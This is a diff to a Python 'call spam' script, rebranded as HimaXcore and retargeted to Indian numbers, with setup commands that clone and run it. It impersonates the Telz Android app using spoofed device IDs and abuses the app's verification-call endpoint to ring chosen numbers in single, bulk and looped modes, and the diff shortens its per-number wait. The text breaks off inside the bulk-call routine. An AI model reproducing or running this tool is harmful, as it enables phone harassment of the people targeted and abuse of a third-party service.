@@ -1,4 +1,14 @@
 #!/usr/bin/env python3
+'''
+pkg update -y && pkg upgrade -y
+pkg install python -y
+pkg install git -y
+git clone https://github.com/VornexxBaba/Call-Spam-Vornex.git
+cd Call-Spam-Vornex
+pip install requests colorama pyfiglet
+python main.py
+python3 main.py
+'''
 
 import requests
 import json
@@ -7,6 +17,7 @@ import uuid
 import os
 import sys
 import random
+import re
 import threading
 from threading import Lock
 from datetime import datetime
@@ -19,6 +30,7 @@ try:
     COLORAMA_VAR = True
 except ImportError:
     COLORAMA_VAR = False
+
     class Fore:
         GREEN = '\033[92m'
         RED = '\033[31m'
@@ -28,12 +40,14 @@ except ImportError:
         MAGENTA = '\033[95m'
         BLUE = '\033[94m'
         BLACK = '\033[30m'
+
     class Back:
         MAGENTA = '\033[45m'
         BLACK = '\033[40m'
         WHITE = '\033[47m'
         GREEN = '\033[42m'
         RED = '\033[41m'
+
     class Style:
         BRIGHT = '\033[1m'
         DIM = '\033[2m'
@@ -45,542 +59,669 @@ try:
 except ImportError:
     PYFIGLET_VAR = False
 
-class AnimasyonluArayuz:
-    
+HIMAXCORE_TAG = "HimaXcore"
+HIMAXCORE_SIGN = f"{Fore.MAGENTA}{Style.BRIGHT}✦ {HIMAXCORE_TAG} ✦{Style.NORMAL}{Fore.WHITE}"
+
+
+class AnimatedInterface:
+
     def __init__(self):
-        self.animasyon_aktif = True
-        self.durum_mesaji = ""
-        self.islem_sayaci = 0
-        self.basari_sayaci = 0
-        self.hata_sayaci = 0
-        
-    def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=3):
+        self.animation_active = True
+        self.status_message = ""
+        self.process_count = 0
+        self.success_count = 0
+        self.error_count = 0
+
+    def loading_animation(self, message="Processing", duration=3):
         spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
-        baslangic = time.time()
-        
-        while time.time() - baslangic < sure:
-            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}... {Style.DIM}')
+        start_time = time.time()
+
+        while time.time() - start_time < duration:
+            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {message}... {Style.DIM}')
             sys.stdout.flush()
             time.sleep(0.1)
-        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı!    \n')
+        sys.stdout.write(f'\r{Fore.GREEN}✓ {message} completed!    \n')
         sys.stdout.flush()
-    
-    def ilerleme_cubugu(self, yuzde, genislik=40):
-        dolu = int(genislik * yuzde / 100)
-        bos = genislik - dolu
-        
-        if yuzde > 66:
-            renk = Fore.GREEN
-        elif yuzde > 33:
-            renk = Fore.YELLOW
+
+    def progress_bar(self, percentage, width=40):
+        filled = int(width * percentage / 100)
+        empty = width - filled
+
+        if percentage > 66:
+            color = Fore.GREEN
+        elif percentage > 33:
+            color = Fore.YELLOW
         else:
-            renk = Fore.RED
-        
-        cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}"
-        sys.stdout.write(f'\r{cubuk} %{yuzde:3.1f}')
+            color = Fore.RED
+
+        bar = f"{color}{'█' * filled}{Style.DIM}{'░' * empty}"
+        sys.stdout.write(f'\r{bar} %{percentage:3.1f}')
         sys.stdout.flush()
-    
-    def banner_goster(self):
+
+    def show_banner(self):
         os.system('clear' if os.name == 'posix' else 'cls')
-        
+
+        print(f"\n{HIMAXCORE_SIGN}\n")
+
         if PYFIGLET_VAR:
-            banner = pyfiglet.figlet_format("VORNEXX CALL", font="slant")
-            print(f"{Fore.CYAN}{Style.BRIGHT}{banner}")
+            banner = pyfiglet.figlet_format("HIMA XCORE", font="slant")
+            print(f"{Fore.MAGENTA}{Style.BRIGHT}{banner}")
         else:
-            print(f"""
-{Fore.YELLOW}██╗░░░██╗░█████╗░██████╗░███╗░░██╗███████╗██╗░░██╗
-██║░░░██║██╔══██╗██╔══██╗████╗░██║██╔════╝╚██╗██╔╝
-╚██╗░██╔╝██║░░██║██████╔╝██╔██╗██║█████╗░░░╚███╔╝░
-░╚████╔╝░██║░░██║██╔══██╗██║╚████║██╔══╝░░░██╔██╗░
-░░╚██╔╝░░╚█████╔╝██║░░██║██║░╚███║███████╗██╔╝╚██╗
-░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
+            print(f"{Fore.MAGENTA}{Style.BRIGHT}    _   _   _   _   _\n   / \\ / \\ / \\ / \\ / \\\n  |  HIMA XCORE  |\n   \\_// \\_// \\_// \\_//\n")
 
-░█████╗░░█████╗░██╗░░░░░██╗░░░░░
-██╔══██╗██╔══██╗██║░░░░░██║░░░░░
-██║░░╚═╝███████║██║░░░░░██║░░░░░
-██║░░██╗██╔══██║██║░░░░░██║░░░░░
-╚█████╔╝██║░░██║███████╗███████╗
-░╚════╝░╚═╝░░╚═╝╚══════╝╚══════╝
-            """)
-        
-        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Geliştirici: {Fore.CYAN}Vornexx ")
-        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.GREEN}Github : VornexxBaba {Fore.CYAN} Instagram : mr.vornexx")
-        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Tarih: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
-        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Termux Uyumlu: {Fore.GREEN}✓")
-        print(f"{Fore.RED}{Style.BRIGHT}{'─'*55}\n")
+        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Brand: {Fore.CYAN}{HIMAXCORE_TAG}")
+        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.GREEN}Operator: {Fore.CYAN}HimaXcore Security")
+        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Region: {Fore.GREEN}India (+91)")
+        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Date: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
+        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Terminal Ready: {Fore.GREEN}✓")
+        print(f"{Fore.RED}{Style.BRIGHT}{'─' * 55}\n")
 
-    def animasyonlu_yaz(self, metin, hiz=0.03, renk=None):
-        if renk is None:
-            renk = Fore.WHITE
-        for harf in metin:
-            sys.stdout.write(f"{renk}{harf}")
+    def typewriter_text(self, text, speed=0.03, color=None):
+        if color is None:
+            color = Fore.WHITE
+        for char in text:
+            sys.stdout.write(f"{color}{char}")
             sys.stdout.flush()
-            time.sleep(hiz)
+            time.sleep(speed)
         print()
-    
-    def durum_goster(self, baslik, durum, detay=""):
-        simgeler = {
-            'basari': f"{Fore.GREEN}✅",
-            'hata': f"{Fore.RED}❌",
-            'bilgi': f"{Fore.CYAN}ℹ️",
-            'uyari': f"{Fore.YELLOW}⚠️",
-            'calisiyor': f"{Fore.BLUE}🔄"
+
+    def show_status(self, title, status, detail=""):
+        symbols = {
+            'success': f"{Fore.GREEN}✅",
+            'error': f"{Fore.RED}❌",
+            'info': f"{Fore.CYAN}ℹ️",
+            'warning': f"{Fore.YELLOW}⚠️",
+            'working': f"{Fore.BLUE}🔄"
         }
-        
-        simge = simgeler.get(durum, "•")
-        
-        if durum == 'basari':
-            renk = Fore.GREEN
-        elif durum == 'hata':
-            renk = Fore.RED
-        elif durum == 'uyari':
-            renk = Fore.YELLOW
-        elif durum == 'bilgi':
-            renk = Fore.CYAN
-        elif durum == 'calisiyor':
-            renk = Fore.BLUE
+
+        symbol = symbols.get(status, "•")
+
+        if status == 'success':
+            color = Fore.GREEN
+        elif status == 'error':
+            color = Fore.RED
+        elif status == 'warning':
+            color = Fore.YELLOW
+        elif status == 'info':
+            color = Fore.CYAN
+        elif status == 'working':
+            color = Fore.BLUE
         else:
-            renk = Fore.WHITE
-            
-        print(f"{simge} {Fore.WHITE}{baslik}: {renk}{detay}")
-    
-    def menu_goster(self):
+            color = Fore.WHITE
+
+        print(f"{symbol} {Fore.WHITE}{title}: {color}{detail}")
+
+    def show_menu(self):
         menu = f"""
-{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
+{Fore.MAGENTA}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
+║                {Fore.WHITE}HimaXcore Console{Fore.MAGENTA}                 ║
 ║                                                      ║
-║  {Fore.YELLOW}[1] {Fore.WHITE}Tekli Arama Başlat                            ║
-║  {Fore.YELLOW}[2] {Fore.WHITE}Çoklu Arama Başlat (Liste)                     ║
-║  {Fore.YELLOW}[3] {Fore.WHITE}Ayarları Değiştir                              ║
-║  {Fore.YELLOW}[4] {Fore.WHITE}İstatistikleri Göster                          ║
-║  {Fore.YELLOW}[5] {Fore.WHITE}Çıkış                                         ║
+║  {Fore.YELLOW}[1] {Fore.WHITE}Start Single Call                              ║
+║  {Fore.YELLOW}[2] {Fore.WHITE}Start Bulk Call (List)                         ║
+║  {Fore.YELLOW}[3] {Fore.WHITE}Loop Call on One Number                       ║
+║  {Fore.YELLOW}[4] {Fore.WHITE}Change Settings                                ║
+║  {Fore.YELLOW}[5] {Fore.WHITE}Show Statistics                                ║
+║  {Fore.YELLOW}[6] {Fore.WHITE}Exit                                           ║
 ║                                                      ║
-{Fore.CYAN}╚══════════════════════════════════════════════════╝
+{Fore.MAGENTA}╚══════════════════════════════════════════════════╝
         """
         print(menu)
 
+
 class RateLimiter:
-    
-    def __init__(self, bekleme_suresi=300):
-        self.bekleme_suresi = float(bekleme_suresi)
-        self.cagri_kayitlari = {}
+
+    def __init__(self, waiting_time=60):
+        self.waiting_time = float(waiting_time)
+        self.call_records = {}
         self.lock = Lock()
-        self.istatistikler = defaultdict(int)
-    
-    def kontrol_et(self, numara):
-        suanki_zaman = time.time()
-        
+        self.stats = defaultdict(int)
+
+    def check(self, number):
+        current_time = time.time()
+
         with self.lock:
-            son_arama = self.cagri_kayitlari.get(numara)
-            
-            if son_arama is None or (suanki_zaman - son_arama) >= self.bekleme_suresi:
-                self.cagri_kayitlari[numara] = suanki_zaman
-                self.istatistikler['izin_verilen'] += 1
+            last_call = self.call_records.get(number)
+
+            if last_call is None or (current_time - last_call) >= self.waiting_time:
+                self.call_records[number] = current_time
+                self.stats['allowed'] += 1
                 return True
             else:
-                kalan_sure = self.bekleme_suresi - (suanki_zaman - son_arama)
-                self.istatistikler['reddedilen'] += 1
-                return False, kalan_sure
-    
-    def bekleme_suresi_degistir(self, yeni_sure):
-        self.bekleme_suresi = float(yeni_sure)
-        
-    def istatistik_al(self):
-        return dict(self.istatistikler)
+                remaining_time = self.waiting_time - (current_time - last_call)
+                self.stats['rejected'] += 1
+                return False, remaining_time
 
-class TelzIstemciGelismis:
-    
-    TEMEL_URL = "https://api.telz.com/"
-    BASLIKLAR = {
+    def change_wait_time(self, new_time):
+        self.waiting_time = float(new_time)
+
+    def get_stats(self):
+        return dict(self.stats)
+
+
+class TelzClientAdvanced:
+
+    BASE_URL = "https://api.telz.com/"
+    HEADERS = {
         'User-Agent': "Telz-Android/17.5.33",
         'Accept-Encoding': "gzip",
         'Content-Type': "application/json; charset=UTF-8"
     }
-    
-    def __init__(self, android_id=None, app_version="17.5.33", os="android", os_version="15"):
-        self.android_id = android_id or self._rastgele_android_id()
+
+    def __init__(self, android_id=None, app_version="17.5.33", os_name="android", os_version="15"):
+        self.android_id = android_id or self._random_android_id()
         self.app_version = app_version
-        self.os = os
+        self.os_name = os_name
         self.os_version = os_version
         self.uuid = str(uuid.uuid4())
         self.session = requests.Session()
-        self.session.headers.update(self.BASLIKLAR)
-        
-        self.istatistikler = {
-            'toplam_istek': 0,
-            'basarili_istek': 0,
-            'basarisiz_istek': 0,
-            'son_hata': None
+        self.session.headers.update(self.HEADERS)
+
+        self.stats = {
+            'total_requests': 0,
+            'successful_requests': 0,
+            'failed_requests': 0,
+            'last_error': None
         }
-    
+
     @staticmethod
-    def _rastgele_android_id():
+    def _random_android_id():
         return uuid.uuid4().hex[:16]
-    
+
     @staticmethod
-    def _rastgele_cihaz_adi():
-        markalar = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto", "Realme", "Oppo"]
-        modeller = ["Pro", "Ultra", "Lite", "Max", "Plus", "5G"]
-        return f"{random.choice(markalar)} {random.choice(modeller)}-{uuid.uuid4().hex[:6]}"
-    
-    def _api_istegi(self, endpoint, veri, timeout=15, tekrar_sayisi=2):
-        url = self.TEMEL_URL + endpoint
-        istek_verisi = veri.copy()
-        
-        istek_verisi.update({
+    def _random_device_name():
+        brands = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto", "Realme", "Oppo"]
+        models = ["Pro", "Ultra", "Lite", "Max", "Plus", "5G"]
+        return f"{random.choice(brands)} {random.choice(models)}-{uuid.uuid4().hex[:6]}"
+
+    def _api_request(self, endpoint, payload, timeout=15, retries=2):
+        url = self.BASE_URL + endpoint
+        request_data = payload.copy()
+
+        request_data.update({
             "android_id": self.android_id,
             "app_version": self.app_version,
-            "os": self.os,
+            "os": self.os_name,
             "os_version": self.os_version,
             "ts": int(time.time() * 1000),
             "uuid": self.uuid
         })
-        
-        for deneme in range(tekrar_sayisi):
+
+        for attempt in range(retries):
             try:
-                self.istatistikler['toplam_istek'] += 1
-                yanit = self.session.post(
+                self.stats['total_requests'] += 1
+                response = self.session.post(
                     url,
-                    data=json.dumps(istek_verisi),
+                    data=json.dumps(request_data),
                     timeout=timeout
                 )
-                
-                if yanit.status_code == 429:
-                    retry_after = yanit.headers.get("Retry-After", "?")
+
+                if response.status_code == 429:
+                    retry_after = response.headers.get("Retry-After", "?")
                     raise RuntimeError(
-                        f"Hız limiti aşıldı! {retry_after} saniye sonra tekrar deneyin."
+                        f"Rate limit reached! Retry in {retry_after} seconds."
                     )
-                
-                yanit.raise_for_status()
-                self.istatistikler['basarili_istek'] += 1
-                
+
+                response.raise_for_status()
+                self.stats['successful_requests'] += 1
+
                 try:
-                    return yanit.json()
+                    return response.json()
                 except ValueError:
-                    return yanit.text
-                    
+                    return response.text
+
             except Exception as e:
-                self.istatistikler['basarisiz_istek'] += 1
-                self.istatistikler['son_hata'] = str(e)
-                
-                if deneme < tekrar_sayisi - 1:
-                    time.sleep(2 ** deneme)
+                self.stats['failed_requests'] += 1
+                self.stats['last_error'] = str(e)
+
+                if attempt < retries - 1:
+                    time.sleep(2 ** attempt)
                     continue
                 raise
-    
-    def kimlik_listesi_al(self):
-        return self._api_istegi("app/auth_list", {"event": "auth_list"})
-    
-    def cihaz_calistir(self, cihaz_adi=None, ipv4="10.1.10.1", ipv6="FE80::1", dil="tr"):
-        cihaz_adi = cihaz_adi or self._rastgele_cihaz_adi()
-        return self._api_istegi("app/run", {
+
+    def get_auth_list(self):
+        return self._api_request("app/auth_list", {"event": "auth_list"})
+
+    def start_device(self, device_name=None, ipv4="10.1.10.1", ipv6="FE80::1", language="en"):
+        device_name = device_name or self._random_device_name()
+        return self._api_request("app/run", {
             "event": "run",
-            "device_name": cihaz_adi,
+            "device_name": device_name,
             "ipv4_address": ipv4,
             "ipv6_address": ipv6,
-            "lang": dil,
-            "network_country": "tr",
+            "lang": language,
+            "network_country": "in",
             "network_type": "4G",
             "roaming": "no",
             "root": "no",
             "run_id": "",
-            "sim_country": "tr"
-        })
-    
-    def buton_durumu_kontrol(self, buton="on_reg_continue"):
-        return self._api_istegi("app/stat_btns", {
-            "event": "stat_btns",
-            "btn": buton
-        })
-    
-    def numara_dogrula(self, telefon, bolge="TR"):
-        return self._api_istegi("app/validate_phonenumber", {
-            "event": "validate_phonenumber",
-            "phone": telefon,
-            "region": bolge
-        })
-    
-    def arama_baslat(self, telefon, deneme="0", dil="tr"):
-        return self._api_istegi("app/auth_call", {
-            "event": "auth_call",
-            "phone": telefon,
-            "attempt": deneme,
-            "lang": dil
-        })
-    
-    def arama_cevapla(self, telefon, basarili=True):
-        return self._api_istegi("app/auth_call_response", {
-            "event": "auth_call_response",
-            "phone": telefon,
-            "success": bool(basarili)
+            "sim_country": "in"
         })
 
-class AramaMotoru:
-    
+    def button_status_check(self, button="on_reg_continue"):
+        return self._api_request("app/stat_btns", {
+            "event": "stat_btns",
+            "btn": button
+        })
+
+    def validate_phone_number(self, phone, region="IN"):
+        return self._api_request("app/validate_phonenumber", {
+            "event": "validate_phonenumber",
+            "phone": phone,
+            "region": region
+        })
+
+    def start_call(self, phone, attempt="0", language="en"):
+        return self._api_request("app/auth_call", {
+            "event": "auth_call",
+            "phone": phone,
+            "attempt": attempt,
+            "lang": language
+        })
+
+    def answer_call(self, phone, success=True):
+        return self._api_request("app/auth_call_response", {
+            "event": "auth_call_response",
+            "phone": phone,
+            "success": bool(success)
+        })
+
+
+class CallEngine:
+
     def __init__(self):
-        self.ui = AnimasyonluArayuz()
-        self.rate_limiter = RateLimiter(bekleme_suresi=300)
-        self.mod = "NORMAL"
-        self.hedef_numaralar = []
-        self.aktif = True
-        self.genel_istatistikler = {
-            'toplam_arama': 0,
-            'basarili_arama': 0,
-            'basarisiz_arama': 0,
-            'baslangic_zamani': datetime.now(),
-            'api_istekleri': 0
+        self.ui = AnimatedInterface()
+        self.rate_limiter = RateLimiter(waiting_time=60)
+        self.mode = "NORMAL"
+        self.target_numbers = []
+        self.active = True
+        self.general_stats = {
+            'total_calls': 0,
+            'successful_calls': 0,
+            'failed_calls': 0,
+            'start_time': datetime.now(),
+            'api_requests': 0
         }
-        self.ayarlar = {
-            'bekleme_suresi': 300,
-            'animasyon_hizi': 0.03,
-            'otomatik_cevap': True,
-            'debug_modu': False,
-            'maksimum_tekrar': 3
+        self.settings = {
+            'waiting_time': 60,
+            'animation_speed': 0.03,
+            'auto_reply': True,
+            'debug_mode': False,
+            'max_retries': 3
         }
-    
-    def baslat(self):
+
+    @staticmethod
+    def normalize_indian_number(number):
+        cleaned = re.sub(r'\D', '', str(number).strip())
+        if not cleaned:
+            return ""
+        if cleaned.startswith('91') and len(cleaned) == 12:
+            return '+' + cleaned
+        if len(cleaned) == 10:
+            return '+91' + cleaned
+        if cleaned.startswith('0') and len(cleaned) == 11:
+            return '+91' + cleaned[1:]
+        return '+' + cleaned if cleaned.startswith('91') else '+' + cleaned
+
+    def start(self):
         try:
-            self.ui.banner_goster()
-            self.ui.animasyonlu_yaz("Sistem baslatiliyor...", 0.02, Fore.CYAN)
-            
-            self._bagimlilik_kontrol()
-            
-            while self.aktif:
-                self.ui.menu_goster()
-                secim = input(f"{Fore.YELLOW}Seciminiz (1-5): {Fore.WHITE}")
-                
-                if secim == "1":
-                    self._tekli_arama()
-                elif secim == "2":
-                    self._coklu_arama()
-                elif secim == "3":
-                    self._ayarlar_menu()
-                elif secim == "4":
-                    self._istatistik_goster()
-                elif secim == "5":
-                    self._cikis()
+            self.ui.show_banner()
+            self.ui.typewriter_text(f"{HIMAXCORE_TAG} system starting...", 0.02, Fore.CYAN)
+            self._check_dependencies()
+
+            while self.active:
+                self.ui.show_menu()
+                choice = input(f"{Fore.YELLOW}Your choice (1-6): {Fore.WHITE}")
+
+                if choice == "1":
+                    self._single_call()
+                elif choice == "2":
+                    self._bulk_call()
+                elif choice == "3":
+                    self._looped_call()
+                elif choice == "4":
+                    self._settings_menu()
+                elif choice == "5":
+                    self._show_statistics()
+                elif choice == "6":
+                    self._exit()
                 else:
-                    print(f"{Fore.RED}Gecersiz secim!")
+                    print(f"{Fore.RED}Invalid selection!")
                     time.sleep(1)
-                    
+
         except KeyboardInterrupt:
-            self._cikis()
+            self._exit()
         except Exception as e:
-            print(f"{Fore.RED}Beklenmeyen hata: {e}")
-            if self.ayarlar['debug_modu']:
+            print(f"{Fore.RED}Unexpected error: {e}")
+            if self.settings['debug_mode']:
                 import traceback
                 traceback.print_exc()
             time.sleep(3)
-    
-    def _bagimlilik_kontrol(self):
+
+    def _check_dependencies(self):
         required = ['requests', 'colorama']
         missing = []
-        
+
         for lib in required:
             try:
                 __import__(lib)
             except ImportError:
                 missing.append(lib)
-        
+
         if missing:
-            self.ui.durum_goster("Kutuphane", "uyari", f"Eksik: {', '.join(missing)}")
-            print(f"{Fore.YELLOW}Yuklemek icin: pip install {' '.join(missing)}")
+            self.ui.show_status("Library", "warning", f"Missing: {', '.join(missing)}")
+            print(f"{Fore.YELLOW}Install with: pip install {' '.join(missing)}")
             time.sleep(2)
-    
-    def _tekli_arama(self):
-        self.ui.banner_goster()
-        
-        print(f"\n{Fore.CYAN}{'─'*55}")
-        numara = input(f"{Fore.WHITE}Hedef numara ({Fore.YELLOW}+90 ile baslayin{Fore.WHITE}): ").strip()
-        
-        if not numara:
-            print(f"{Fore.RED}Numara bos olamaz!")
+
+    def _single_call(self):
+        self.ui.show_banner()
+
+        print(f"\n{Fore.CYAN}{'─' * 55}")
+        number = input(f"{Fore.WHITE}Target number (example: {Fore.YELLOW}+91 98765 43210{Fore.WHITE}): ").strip()
+
+        if not number:
+            print(f"{Fore.RED}Number cannot be empty!")
             time.sleep(1)
             return
-            
-        if not numara.startswith("+"):
-            numara = "+90" + numara
-        
-        self.ui.animasyonlu_yaz(f"\nNumara dogrulaniyor: {numara}", 0.02, Fore.CYAN)
-        
-        istemci = TelzIstemciGelismis()
-        self.genel_istatistikler['toplam_arama'] += 1
-        
-        adimlar = [
-            ("Kimlik dogrulama", lambda: istemci.kimlik_listesi_al()),
-            ("Cihaz hazirlama", lambda: istemci.cihaz_calistir()),
-            ("Buton kontrolu", lambda: istemci.buton_durumu_kontrol()),
-            ("Numara dogrulama", lambda: istemci.numara_dogrula(numara)),
+
+        number = self.normalize_indian_number(number)
+        if not number or not number.startswith('+91'):
+            print(f"{Fore.RED}Please enter a valid Indian mobile number with +91 prefix.")
+            time.sleep(1)
+            return
+
+        self.ui.typewriter_text(f"\nValidating number: {number}", 0.02, Fore.CYAN)
+
+        client = TelzClientAdvanced()
+        self.general_stats['total_calls'] += 1
+
+        steps = [
+            ("Identity verification", lambda: client.get_auth_list()),
+            ("Device setup", lambda: client.start_device()),
+            ("Button check", lambda: client.button_status_check()),
+            ("Number validation", lambda: client.validate_phone_number(number, "IN")),
         ]
-        
-        basarili_adimlar = 0
-        for adim_adi, islem in adimlar:
+
+        successful_steps = 0
+        for step_name, process in steps:
             try:
-                self.ui.yukleniyor_animasyonu(adim_adi, 1.5)
-                sonuc = islem()
-                self.ui.durum_goster(adim_adi, "basari", "Tamamlandi")
-                basarili_adimlar += 1
-                self.genel_istatistikler['api_istekleri'] += 1
+                self.ui.loading_animation(step_name, 1.5)
+                result = process()
+                self.ui.show_status(step_name, "success", "Completed")
+                successful_steps += 1
+                self.general_stats['api_requests'] += 1
             except Exception as e:
-                self.ui.durum_goster(adim_adi, "hata", str(e)[:50])
-                if self.ayarlar['debug_modu']:
+                self.ui.show_status(step_name, "error", str(e)[:50])
+                if self.settings['debug_mode']:
                     import traceback
                     traceback.print_exc()
                 return
-        
-        if basarili_adimlar == len(adimlar):
+
+        if successful_steps == len(steps):
             try:
-                print(f"\n{Fore.YELLOW}{'─'*55}")
-                self.ui.animasyonlu_yaz("Arama baslatiliyor...", 0.03, Fore.GREEN)
-                
-                kontrol_sonucu = self.rate_limiter.kontrol_et(numara)
-                if kontrol_sonucu == True or (isinstance(kontrol_sonucu, tuple) and kontrol_sonucu[0]):
+                print(f"\n{Fore.YELLOW}{'─' * 55}")
+                self.ui.typewriter_text("Starting call...", 0.03, Fore.GREEN)
+
+                check_result = self.rate_limiter.check(number)
+                if check_result == True or (isinstance(check_result, tuple) and check_result[0]):
                     for i in range(21):
-                        yuzde = (i / 20) * 100
-                        self.ui.ilerleme_cubugu(yuzde)
+                        percentage = (i / 20) * 100
+                        self.ui.progress_bar(percentage)
                         time.sleep(0.3)
                     print()
-                    
-                    sonuc = istemci.arama_baslat(numara)
-                    self.genel_istatistikler['basarili_arama'] += 1
-                    self.genel_istatistikler['api_istekleri'] += 1
-                    
-                    print(f"{Fore.GREEN}Arama basariyla baslatildi!")
-                    
-                    if self.ayarlar['debug_modu']:
-                        print(f"{Fore.CYAN}Sunucu yaniti: {json.dumps(sonuc, indent=2)}")
-                    
-                    self.ui.animasyonlu_yaz("\n20 saniye bekleniyor...", 0.02, Fore.YELLOW)
+
+                    result = client.start_call(number)
+                    self.general_stats['successful_calls'] += 1
+                    self.general_stats['api_requests'] += 1
+
+                    print(f"{Fore.GREEN}Call started successfully!")
+
+                    if self.settings['debug_mode']:
+                        print(f"{Fore.CYAN}Server response: {json.dumps(result, indent=2)}")
+
+                    self.ui.typewriter_text("\nWaiting 20 seconds...", 0.02, Fore.YELLOW)
                     for i in range(20, 0, -1):
-                        sys.stdout.write(f"\r{Fore.CYAN}Kalan sure: {i} saniye ")
+                        sys.stdout.write(f"\r{Fore.CYAN}Time left: {i} seconds ")
                         sys.stdout.flush()
                         time.sleep(1)
                     print()
                 else:
-                    kalan = kontrol_sonucu[1] if isinstance(kontrol_sonucu, tuple) else self.ayarlar['bekleme_suresi']
-                    print(f"{Fore.RED}Bu numara icin {kalan:.0f} saniye beklemelisiniz!")
-                    self.genel_istatistikler['basarisiz_arama'] += 1
-                    
+                    remaining = check_result[1] if isinstance(check_result, tuple) else self.settings['waiting_time']
+                    print(f"{Fore.RED}You need to wait {remaining:.0f} seconds for this number!")
+                    self.general_stats['failed_calls'] += 1
+
             except Exception as e:
-                self.ui.durum_goster("Arama", "hata", str(e)[:50])
-                self.genel_istatistikler['basarisiz_arama'] += 1
-                if self.ayarlar['debug_modu']:
+                self.ui.show_status("Call", "error", str(e)[:50])
+                self.general_stats['failed_calls'] += 1
+                if self.settings['debug_mode']:
                     import traceback
                     traceback.print_exc()
-        
-        input(f"\n{Fore.CYAN}Devam etmek icin ENTER...")
-    
-    def _coklu_arama(self):
-        self.ui.banner_goster()
-        print(f"\n{Fore.CYAN}{'─'*55}")
-        print(f"{Fore.YELLOW}Coklu Arama Modu")
-        print(f"{Fore.CYAN}{'─'*55}")
-        
-        print(f"\n{Fore.WHITE}Numaralari alt alta girin (Cikmak icin bos satir):")
-        print(f"{Fore.CYAN}Ornek: +905001234567")
-        
-        numaralar = []
+
+        input(f"\n{Fore.CYAN}Press ENTER to continue...")
+
+    def _bulk_call(self):
+        self.ui.show_banner()
+        print(f"\n{Fore.CYAN}{'─' * 55}")
+        print(f"{Fore.YELLOW}Bulk Call Mode")
+        print(f"{Fore.CYAN}{'─' * 55}")
+
+        print(f"\n{Fore.WHITE}Enter numbers one per line (blank line to finish):")
+        print(f"{Fore.CYAN}Example: +91 98765 43210")
+
+        numbers = []
         while True:
-            numara = input(f"{Fore.GREEN}Numara {len(numaralar)+1}: {Fore.WHITE}").strip()
-            if not numara:
+            number = input(f"{Fore.GREEN}Number {len(numbers) + 1}: {Fore.WHITE}").strip()
+            if not number:
                 break
-            if not numara.startswith("+"):
-                numara = "+90" + numara
-            numaralar.append(numara)
-        
-        if not numaralar:
-            print(f"{Fore.RED}Hic numara girilmedi!")
+            normalized = self.normalize_indian_number(number)
+            if normalized.startswith('+91'):
+                numbers.append(normalized)
+            else:
+                print(f"{Fore.RED}Skipped invalid number: {number}")
+
+        if not numbers:
+            print(f"{Fore.RED}No numbers were entered!")
             time.sleep(1)
             return
-        
-        print(f"\n{Fore.CYAN}Toplam {len(numaralar)} numara islenecek.")
-        print(f"{Fore.YELLOW}Bu islem uzun surebilir!")
-        
-        onay = input(f"{Fore.WHITE}Devam etmek istiyor musunuz? (e/h): ").lower()
-        if onay != 'e':
+
+        print(f"\n{Fore.CYAN}Total {len(numbers)} numbers will be processed.")
+        print(f"{Fore.YELLOW}This may take some time!")
+
+        confirm = input(f"{Fore.WHITE}Do you want to continue? (y/n): ").lower()
+        if confirm != 'y':
             return
-        
-        basarili = 0
-        basarisiz = 0
-        
-        for i, numara in enumerate(numaralar, 1):
-            print(f"\n{Fore.CYAN}{'─'*55}")
-            print(f"{Fore.YELLOW}[{i}/{len(numaralar)}] Isleniyor: {numara}")
-            
+
+        successful = 0
+        failed = 0
+
+        for i, number in enumerate(numbers, 1):
+            print(f"\n{Fore.CYAN}{'─' * 55}")
+            print(f"{Fore.YELLOW}[{i}/{len(numbers)}] Processing: {number}")
+
             try:
-                istemci = TelzIstemciGelismis()
-                
-                istemci.kimlik_listesi_al()
-                istemci.cihaz_calistir()
-                istemci.buton_durumu_kontrol()
-                istemci.numara_dogrula(numara)
-                
-                kontrol_sonucu = self.rate_limiter.kontrol_et(numara)
-                if kontrol_sonucu == True or (isinstance(kontrol_sonucu, tuple) and kontrol_sonucu[0]):
-                    istemci.arama_baslat(numara)
-                    basarili += 1
-                    self.ui.durum_goster("Sonuc", "basari", f"Arama baslatildi")
+                client = TelzClientAdvanced()
+
+                client.get_auth_list()
+                client.start_device()
+                client.button_status_check()
+                client.validate_phone_number(number, "IN")
+
+                check_result = self.rate_limiter.check(number)
+                if check_result == True or (isinstance(check_result, tuple) and check_result[0]):
+                    client.start_call(number)
+                    successful += 1
+                    self.ui.show_status("Result", "success", "Call started")
                 else:
-                    basarisiz += 1
-                    kalan = kontrol_sonucu[1] if isinstance(kontrol_sonucu, tuple) else self.ayarlar['bekleme_suresi']
-                    self.ui.durum_goster("Sonuc", "hata", f"Rate limit: {kalan:.0f}s")
-                    
+                    failed += 1
+                    remaining = check_result[1] if isinstance(check_result, tuple) else self.settings['waiting_time']
+                    self.ui.show_status("Result", "error", f"Rate limit: {remaining:.0f}s")
+
             except Exception as e:
-                basarisiz += 1
-                self.ui.durum_goster("Sonuc", "hata", str(e)[:50])
-            
-            if i < len(numaralar):
+                failed += 1
+                self.ui.show_status("Result", "error", str(e)[:50])
+
+            if i < len(numbers):
                 time.sleep(5)
-        
